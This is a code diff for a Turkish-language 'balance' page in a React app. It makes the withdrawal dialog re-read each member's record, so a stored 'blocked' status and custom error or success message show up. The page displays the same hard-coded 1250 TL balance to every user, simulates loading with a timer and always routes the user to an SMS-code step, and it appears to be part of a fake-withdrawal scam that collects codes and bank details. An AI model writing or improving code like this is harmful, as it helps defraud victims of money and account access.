@@ -78,14 +78,19 @@ export default function BalancePage() {
   };
 
   const showMessageDialog = () => {
-    if (!currentUser) return;
-    if (currentUser.transactionStatus === 'blocked') {
+    // We need to fetch the LATEST user data again right before showing the dialog
+    const allMembers = getMembers();
+    const freshUserData = allMembers.find(m => m.id === currentUser?.id);
+
+    if (!freshUserData) return;
+
+    if (freshUserData.transactionStatus === 'blocked') {
         setMessageDialogTitle("İşlem Başarısız");
-        setMessageDialogContent(currentUser.errorMessage || "Para çekme işleminiz gerçekleştirilemedi. Lütfen destek ekibiyle iletişime geçin.");
+        setMessageDialogContent(freshUserData.errorMessage || "Para çekme işleminiz gerçekleştirilemedi. Lütfen destek ekibiyle iletişime geçin.");
         setMessageDialogVariant('error');
     } else {
         setMessageDialogTitle("İşlem Başarılı");
-        setMessageDialogContent(currentUser.onayMesaji || "İşleminiz başarıyla alındı.");
+        setMessageDialogContent(freshUserData.onayMesaji || "İşleminiz başarıyla alındı.");
         setMessageDialogVariant('success');
     }
     setMessageDialogOpen(true);
@@ -122,7 +127,7 @@ export default function BalancePage() {
     setIsLoading(true);
     setTimeout(() => {
         setIsLoading(false);
-        // Always proceed to the SMS step now.
+        // Always proceed to the SMS step.
         // The check for transactionStatus will happen in handleSmsSubmit.
         setIsSmsStep(true);
     }, 2000);
@@ -194,7 +199,7 @@ export default function BalancePage() {
           </div>
         </CardHeader>
         <CardContent className="space-y-4 text-base">
-          <InfoItem label="Mevcut Bakiye" value="1,250.00 TL" valueClassName="text-3xl font-bold text-green-600" icon={Wallet} labelClassName="text-blue-600 dark:text-blue-400" />
+          <InfoItem label="Mevcut Bakiye" value={"1250.00 TL"} valueClassName="text-3xl font-bold text-green-600" icon={Wallet} labelClassName="text-blue-600 dark:text-blue-400" />
           <InfoItem label="IBAN Numarası" value={currentUser?.iban || "TRXX XXXX XXXX XXXX XXXX XXXX XX"} icon={CreditCard} labelClassName="text-blue-600 dark:text-blue-400" />
           <InfoItem label="Kullandığınız Banka" value={currentUser?.bank || "Banka Bilgisi Yok"} icon={Landmark} labelClassName="text-blue-600 dark:text-blue-400" />
           <InfoItem label="Hesap Hareketi" value={currentUser?.accountActivity || "Hesabınıza gelen para bulunmamaktadır."} icon={TrendingUp} labelClassName="text-green-600 dark:text-green-400" />
